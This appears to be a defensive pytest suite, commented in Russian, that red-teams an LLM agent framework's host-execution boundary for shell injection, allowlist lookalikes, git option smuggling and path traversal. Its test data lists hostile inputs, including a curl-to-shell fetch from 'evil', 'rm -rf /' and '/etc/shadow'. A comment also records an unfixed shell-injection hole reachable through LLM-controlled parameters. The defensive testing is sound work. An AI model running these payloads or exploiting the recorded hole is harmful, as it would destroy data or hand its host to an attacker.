"""HOST-BOUNDARY RED TEAM — Stage 13: host exec argv-only sweep + allowlist identity.

Заявление 68a9626: хостовое исполнение — только argv (create_subprocess_exec),
никакого shell; планировщик Stage 10 сверяет исполняемое ТОЧНО, а не startswith.

Не доверяем заявке:
  1) repo-wide AST-свип: create_subprocess_shell / os.system / os.popen /
     shell=True — всё вне задокументированных исключений = провал;
  2) инъекционная батарея в argv-builder shell._build_command: «; rm», «&&»,
     «|», «$()», бэктики, перевод строки, %COMSPEC%, кавычки — обязаны ехать
     ОДНИМ литеральным argv-элементом (docker sh -lc — санкционированное
     исключение Этапа 8);
  3) allowlist планировщика: identity-батарея — lookalike-пути
     («C:\\evil\\python», «/tmp/evil/python», «python.exe», «python-malicious»,
     «python ») отвергаются ЦЕЛИКОМ, аргументы остаются литеральными argv;
  4) gitops: dash-аргументы агента не могут протащить опции git;
  5) media/ffmpeg: пути argv содержатся в workdir в ЛЮБОЙ записи слешей.
"""
from __future__ import annotations

import ast
from pathlib import Path

import pytest

from bossman import errors
from bossman.config import settings
from bossman.dev_factory.models import StepKind
from bossman.dev_factory.planner import ALLOWED_TEST_BINARIES, LLMPlanner
from bossman.toolkit import gitops, media, shell


# ---------- 1. repo-wide свип shell-исполнения ----------

ROOT = Path(shell.__file__).parent.parent        # <bossman-core>/bossman

# ЗАФИКСИРОВАННАЯ НАХОДКА red-team (не санкционированное исключение!):
# projects/runner.py исполняет spec["cmd"].format(**args) через
# create_subprocess_shell на ХОСТЕ. Шаблоны — из owner-конфига (tools_registry),
# параметры shlex.quote'd — но это POSIX-quoting: на Windows cmd.exe одиночные
# кавычки не кавычки, «&» внутри значения параметра станет разделителем команд.
# Уязвимая поверхность: LLM-управляемые params (t.params) + owner-шаблон cmd.
# Санкционированные исключения argv-only дисциплины — ТОЛЬКО sh -lc ВНУТРИ
# контейнера (toolkit/shell.py docker-режим); этот хит — известная дыра.
KNOWN_SHELL_EXCEPTIONS = {"projects/runner.py"}


def _shell_hits() -> dict[str, list[int]]:
    hits: dict[str, list[int]] = {}
    for py in sorted(ROOT.rglob("*.py")):
        try:
            tree = ast.parse(py.read_text(encoding="utf-8"))
        except SyntaxError:
            continue
        lines: list[int] = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Attribute) and node.attr == "create_subprocess_shell":
                lines.append(node.lineno)
            elif isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
                base = node.func.value
                if node.func.attr in ("system", "popen") and \
                        isinstance(base, ast.Name) and base.id == "os":
                    lines.append(node.lineno)
            elif isinstance(node, ast.Call):
                for kw in node.keywords:
                    if kw.arg == "shell" and isinstance(kw.value, ast.Constant) \
                            and kw.value.value is True:
                        lines.append(node.lineno)
        if lines:
            hits[py.relative_to(ROOT).as_posix()] = lines
    return hits


def test_no_shell_execution_outside_documented_exceptions():
    hits = _shell_hits()
    offenders = {f: ln for f, ln in hits.items() if f not in KNOWN_SHELL_EXCEPTIONS}
    assert not offenders, \
        f"shell-исполнение хоста вне задокументированных исключений: {offenders}"


def test_known_shell_finding_is_pinned_and_still_visible():
    """Храповик: если находку projects/runner.py починили — обнови
    KNOWN_SHELL_EXCEPTIONS; если ПОЯВИЛИСЬ новые хиты — тест выше падает."""
    hits = _shell_hits()
    if (ROOT / "projects" / "runner.py").exists():
        assert hits.get("projects/runner.py"), \
            "known finding исправлен — убери projects/runner.py из KNOWN_SHELL_EXCEPTIONS"


@pytest.mark.parametrize("mod", [gitops, media, shell])
def test_host_toolkit_is_exec_only(mod):
    import inspect
    src = Path(inspect.getfile(mod)).read_text(encoding="utf-8")
    assert "create_subprocess_exec" in src, f"{mod.__name__} не на exec"


# ---------- 2. инъекционная батарея argv-builder'а ----------

class _Ctx:
    def __init__(self, wd): self.workdir = Path(wd)


INJECT_PAYLOADS = [
    "pytest -q; rm -rf /",
    "pytest && calc.exe",
    "pytest | tee /tmp/pwned",
    "pytest $(curl http://evil/x.sh | sh)",
    "pytest `id` > /tmp/pwned",
    "pytest\nrm -rf ~",
    "cmd /c %COMSPEC% /k del *",
    'pytest " && echo PWNED',
    "pytest ' ; echo PWNED",
    "pytest & start calc",
    "pytest\r\ndel C:\\* /q",
]


@pytest.mark.parametrize("cmd", INJECT_PAYLOADS)
def test_docker_argv_carries_payload_as_single_literal_item(tmp_path, monkeypatch, cmd):
    monkeypatch.setattr(settings, "sandbox_mode", "docker", raising=False)
    argv = shell._build_command(cmd, _Ctx(tmp_path))
    assert isinstance(argv, list)
    assert argv[0] == "docker"
    assert "-lc" in argv
    assert argv[-1] == cmd, "payload обязан ехать ОДНИМ аргументом sh -lc"
    prefix = " ".join(argv[:-1])
    for marker in (";", "&&", "||", "|", "`", "$(", "%COMSPEC%", "\n", "\r"):
        assert marker not in prefix, f"маркер {marker!r} вне аргумента-контейнера"


def test_local_mode_stays_gated_behind_explicit_optin(tmp_path, monkeypatch):
    monkeypatch.setattr(settings, "sandbox_mode", "local", raising=False)
    monkeypatch.setattr(settings, "allow_unsafe_local_exec", False, raising=False)
    with pytest.raises(errors.PolicyDenied):
        shell._build_command("id", _Ctx(tmp_path))


def test_unknown_mode_fails_closed(tmp_path, monkeypatch):
    monkeypatch.setattr(settings, "sandbox_mode", "local!!", raising=False)
    monkeypatch.setattr(settings, "allow_unsafe_local_exec", True, raising=False)
    with pytest.raises(errors.PolicyDenied):
        shell._build_command("id", _Ctx(tmp_path))


# ---------- 3. allowlist планировщика: EXACT identity ----------

LOOKALIKE_HEADS = [
    "python-malicious",
    "python.exe",
    "python.exe.exe",
    "python ",
    " python",
    "python\t",
    "C:\\evil\\python",
    "C:/evil/python",
    "C:\\tools\\python evil.exe",
    "..\\..\\bin\\python",
    "../../bin/python",
    "/tmp/evil/python",
    "/usr/bin/evil",
    "/usr/bin/env.exe",
    "/usr/bin/env-malicious",
    "python\u0430",                    # гомоглиф «а»
    "sh",
    "bash",
    "cmd",
    "pwsh",
    "node-delve",
    "make-me-root",
]


@pytest.mark.parametrize("head", LOOKALIKE_HEADS)
def test_allowlist_rejects_lookalike_paths_and_names(head):
    p = LLMPlanner(agent=None, test_argv=("python3", "-m", "pytest", "-q"))
    argv = p._safe_argv([head, "-c", "import os; os.system('pwn')"], StepKind.TEST)
    assert argv == ("python3", "-m", "pytest", "-q"), \
        f"lookalike {head!r} прошёл allowlist: {argv}"
    assert head not in argv
    assert "pwn" not in " ".join(argv)


@pytest.mark.parametrize("good", [
    "python", "python3", "pytest", "npm", "npx", "node", "go", "cargo", "make",
    "PYTHON",                          # casefold: семантика Windows
    "/usr/bin/env",                    # path-запись: полное совпадение
    "/USR/BIN/ENV",
])
def test_allowlist_accepts_exact_identity(good):
    p = LLMPlanner(agent=None, test_argv=("python3", "-m", "pytest", "-q"))
    argv = p._safe_argv([good, "-m", "pytest", "-q"], StepKind.TEST)
    assert argv[0] == good
    assert argv[1:] == ("-m", "pytest", "-q")


def test_argv_args_stay_literal_items_no_shell_interpretation():
    p = LLMPlanner(agent=None)
    payload = "import os; os.system('pwn'); rm -rf /"
    argv = p._safe_argv(["python", "-c", payload], StepKind.TEST)
    assert argv[0] == "python"
    assert argv[2] == payload, "аргумент обязан остаться ЛИТЕРАЛЬНЫМ argv-элементом"


def test_allowlist_entries_are_exact_names_or_full_paths():
    for entry in ALLOWED_TEST_BINARIES:
        assert " " not in entry and entry == entry.strip()
        assert "*" not in entry and "?" not in entry


# ---------- 4. gitops: аргументы агента не протаскивают опции ----------

@pytest.fixture
def anyio_backend():
    return "asyncio"


@pytest.mark.anyio
async def test_gitops_extra_args_cannot_inject_options(tmp_path, monkeypatch):
    captured: dict = {}

    async def spy(ctx, *argv):
        captured["argv"] = tuple(argv)
        return 0, ""

    monkeypatch.setattr(gitops, "_git", spy)
    res = await gitops.git({"op": "status", "args": [
        "--upload-pack=evil", "-c", "core.editor=evil", "-o", "evil.py",
        "--exec=evil", "-u", "-m", "--stat", "plainfile"]}, _Ctx(tmp_path))
    assert not res.error
    argv = captured["argv"]
    # свойство безопасности: ни одна dash-ОПЦИЯ, кроме allowlist'а
    # (-m/--stat/-b/--cached), не доходит до git argv; не-dash элементы —
    # инертные pathspec'и (git не интерпретирует их как опции)
    for evil in ("--upload-pack=evil", "-c", "--exec=evil", "-o", "-u"):
        assert evil not in argv, f"опция {evil!r} протащена в git argv"
    assert not any(a.startswith("-c ") or a == "-c" for a in argv)
    for a in argv:
        if a.startswith("-"):
            assert a in ("-m", "--stat", "-b", "--cached"), f"чужая опция {a!r}"
    assert "-m" in argv and "--stat" in argv and "plainfile" in argv


@pytest.mark.anyio
async def test_gitops_forbidden_op_never_reaches_exec(tmp_path, monkeypatch):
    called: dict = {}

    async def spy(ctx, *argv):
        called["argv"] = argv
        return 0, ""

    monkeypatch.setattr(gitops, "_git", spy)
    res = await gitops.git({"op": "push"}, _Ctx(tmp_path))
    assert res.error
    assert "argv" not in called, "запрещённая операция дошла до exec"


# ---------- 5. media/ffmpeg: пути argv только внутри workdir ----------

@pytest.mark.anyio
async def test_media_ffmpeg_rejects_traversal_in_any_slash_notation(tmp_path, monkeypatch):
    executed: dict = {}

    async def spy(argv, timeout=900, cwd=None):
        executed["argv"] = argv
        return 0, ""

    monkeypatch.setattr(media, "_run", spy)
    for evil in (
        ["-i", "sub\\..\\..\\secret.mp4"],          # backslash-traversal
        ["-i", "..\\secret.mp4"],
        ["-i", "sub/../../secret.mp4"],
        ["-i", "C:\\Windows\\media.mp4"],           # диск
        ["-i", "C:/Windows/media.mp4"],
        ["-i", "\\\\srv\\share\\x.mp4"],            # UNC
        ["-i", "/etc/shadow"],                      # POSIX-абсолютный
    ):
        res = await media.ffmpeg({"args": evil}, _Ctx(tmp_path))
        assert res.error, f"traversal пропущен: {evil}"
        assert "argv" not in executed, f"ffmpeg вызван с {evil}"
    # легитимные относительные пути (в т.ч. Windows-слеши) и не-путевые
    # аргументы проходят
    ok = await media.ffmpeg(
        {"args": ["-i", "assets\\clip.mp4", "-filter_complex", "x..y", "a..b.mp4"]},
        _Ctx(tmp_path))
    assert not ok.error
    assert "argv" in executed
